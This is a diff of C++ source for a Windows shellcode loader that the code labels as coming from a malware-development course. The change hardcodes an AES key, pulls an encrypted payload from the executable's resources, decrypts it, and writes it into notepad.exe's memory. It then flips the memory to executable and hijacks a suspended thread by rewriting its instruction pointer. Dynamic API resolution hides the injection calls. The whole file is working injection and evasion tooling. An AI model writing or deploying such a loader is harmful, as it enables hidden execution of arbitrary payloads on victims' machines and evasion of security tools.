@@ -7,7 +7,7 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "advapi32")
 #include <psapi.h>
-//#include "resource1.h"
+#include "resource.h"
 
 /*
 1. Creating a snapshot of processes running on the system
@@ -36,6 +36,7 @@ HMODULE libHM = LoadLibraryW(L"kernel32.dll");
 // MessageBox shellcode - 64-bit (exitfunc = thread)
 //         - >> Hello World ! <<
 //              UNENCRYPTED
+/*
 unsigned char shellcode[] =
 "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
 "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
@@ -66,7 +67,10 @@ unsigned char shellcode[] =
 "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
 "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
 "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
+*/
 
+unsigned char key[] = { 0xe, 0x5, 0xc9, 0x95, 0x8a, 0x63, 0x45, 0x1, 0x80, 0xa0, 0xb, 0x70, 0x3f, 0x4b, 0x5c, 0x71 };
+DWORD key_len = sizeof(key);
 
 // RTO Mal Dev course
 int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {
@@ -76,31 +80,31 @@ int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keyl
 
     BOOL CryptAcquire = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
     if (CryptAcquire == false) {
-        //printf("CryptAcquireContextW Failed: %d\n", GetLastError());
+        printf("CryptAcquireContextW Failed: %d\n", GetLastError());
         return -1;
     }
 
     BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
     if (CryptCreate == false) {
-        //printf("CryptCreateHash Failed: %d\n", GetLastError());
+        printf("CryptCreateHash Failed: %d\n", GetLastError());
         return -1;
     }
 
     BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
     if (CryptHash == false) {
-        //printf("CryptHashData Failed: %d\n", GetLastError());
+        printf("CryptHashData Failed: %d\n", GetLastError());
         return -1;
     }
 
     BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
     if (CryptDerive == false) {
-        //printf("CryptDeriveKey Failed: %d\n", GetLastError());
+        printf("CryptDeriveKey Failed: %d\n", GetLastError());
         return -1;
     }
 
     BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);
     if (Crypt_Decrypt == false) {
-        //printf("CryptDecrypt Failed: %d\n", GetLastError());
+        printf("CryptDecrypt Failed: %d\n", GetLastError());
         return -1;
     }
 
@@ -149,16 +153,20 @@ DWORD FindThread(DWORD pid) {
     THREADENTRY32 threadInfo;
     threadInfo.dwSize = sizeof(threadInfo);
     
+    // Handles and thread id vars
     HANDLE thSnap;
+
     DWORD thID = NULL;
     HANDLE tHandle = NULL;
 
+    // Take snapshot of threads
     thSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
     if (thSnap == INVALID_HANDLE_VALUE) {
         printf("[-] Snapshot of system threads failed: %d\n", GetLastError());
         return 0;
     }
 
+    // Match PID with found thread ID, break if it does
     while (Thread32Next(thSnap, &threadInfo)) {
         if (threadInfo.th32OwnerProcessID == pid) {
             thID = threadInfo.th32ThreadID;
@@ -189,25 +197,32 @@ int iCTX(HANDLE pHandle, DWORD processId, unsigned char* payload, SIZE_T scSize)
     CONTEXT ctx{};
 
     DWORD oldProtect;
-    SIZE_T bytesWritten; //This can be a null pointer
+    SIZE_T bytesWritten; //This can be a null pointer in func
 
+    // Find thread ID, set permissions for handle to thread
     DWORD thID = FindThread(processId);
     HANDLE tHandle = pOpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thID);
     if (!tHandle) return 0;// else return tHandle;
     printf("[+] Acquired Thread Handle [ %p ] for Thread [ %d ] \n", tHandle, thID);
 
+    // Allocate memory in process where thread is located
     LPVOID vAlloc = pVirtualAllocExNuma(pHandle, NULL, scSize, MEM_COMMIT, PAGE_READWRITE, 0);
     if (!vAlloc) {
         printf("[-] Allocating memory in thread failed [ %d ]\n", GetLastError());
         return -2;
     }
+    printf("[+] Remote Alloc [ %p ]\n", vAlloc);
 
+    AESDecrypt((unsigned char*)payload, (DWORD)scSize, (char*)key, key_len);
+
+    // Write shellcode in memory
     if (!pWriteProcessMemory(pHandle, vAlloc, payload, scSize, &bytesWritten)) {
         printf("[-] Writing shellcode in allocated memory failed [ %d ]\n", GetLastError());
         return -2;
     }
 
-    
+
+    // Change page protection -> RX
     if (!pVirtualProtectEx(pHandle, vAlloc, scSize, PAGE_EXECUTE_READ, &oldProtect)) {
         printf("[-] Changing memory protection faield [ %d ]", GetLastError());
         return -2;
@@ -217,6 +232,7 @@ int iCTX(HANDLE pHandle, DWORD processId, unsigned char* payload, SIZE_T scSize)
     SuspendThread(tHandle);
     printf("[+] Suspended the Thread [ %d ] of Process [ %d ] successfully\n", (int)thID, (int)processId);
 
+    // Get full thread context
     ctx.ContextFlags = CONTEXT_FULL;
     GetThreadContext(tHandle, &ctx);
 
@@ -227,20 +243,23 @@ int iCTX(HANDLE pHandle, DWORD processId, unsigned char* payload, SIZE_T scSize)
     ctx.Rip = (DWORD_PTR)vAlloc;
 #endif
     
-    //ctx.Rip = (DWORD_PTR)vAlloc;
     if (!SetThreadContext(tHandle, &ctx)) {
-        printf("Failed setting thread context: %d\n", GetLastError());
+        printf("[-] Failed setting thread context: %d\n", GetLastError());
         return -2;
     }
 
     DWORD rThread = ResumeThread(tHandle);
     
     if (!rThread) {
-        printf("Cant resume thread: %d\n", GetLastError());
+        printf("[-] Cant resume thread: %d\n", GetLastError());
         return -2;
     }
 
+    // Close process handle and free memory;
+    CloseHandle(tHandle);
+
     return rThread;
+
 }
 
 
@@ -253,23 +272,22 @@ int main()
         return -2;
     }
 
+    (FARPROC&)pVirtualAllocExNuma = GetProcAddress(libHM, "VirtualAllocExNuma");
     (FARPROC&)pOpenProcess = GetProcAddress(libHM, "OpenProcess");
 
     FreeLibrary(libHM);
 
-    //unsigned char key[] = { 0xe, 0x5, 0xc9, 0x95, 0x8a, 0x63, 0x45, 0x1, 0x80, 0xa0, 0xb, 0x70, 0x3f, 0x4b, 0x5c, 0x71 };
-    //DWORD key_len = sizeof(key);
-    //unsigned char* shellcode;
+    
+    unsigned char* shellcode;
     DWORD scSize = sizeof(shellcode);
 
     // Generate a resource.rc & resource.h poiting to a file of binary (raw) type shellcode
     // .rsrc storage && .rsrc payload extraction
-    /*
+
     HRSRC res = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
     HGLOBAL resHandle = LoadResource(NULL, res);
     shellcode = (unsigned char*)LockResource(resHandle);
     scSize = SizeofResource(NULL, res);
-    */
 
     auto procPid = FindProcessId(L"notepad.exe");
     if (!procPid) {
@@ -278,11 +296,23 @@ int main()
     }
     printf("[+] Process ID: %d\n", procPid);
 
-    HANDLE hProcess = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
-        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, procPid);
+    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, false, procPid);
 
     if (hProcess) {
-        iCTX(hProcess, procPid, shellcode, scSize);
+
+        // Allocate memory in process where thread is located
+        LPVOID Alloc = pVirtualAllocExNuma(GetCurrentProcess(), NULL, scSize, MEM_COMMIT, PAGE_READWRITE, 0);
+        if (!Alloc) {
+            printf("[-] Allocating memory in thread failed [ %d ]\n", GetLastError());
+            return -2;
+        }
+        printf("[+] Local Alloc [ %p ]\n", Alloc);
+
+        getchar();
+
+        memmove(Alloc, shellcode, scSize);
+
+        iCTX(hProcess, procPid, (unsigned char*)Alloc, scSize);
         CloseHandle(hProcess);
     }
 
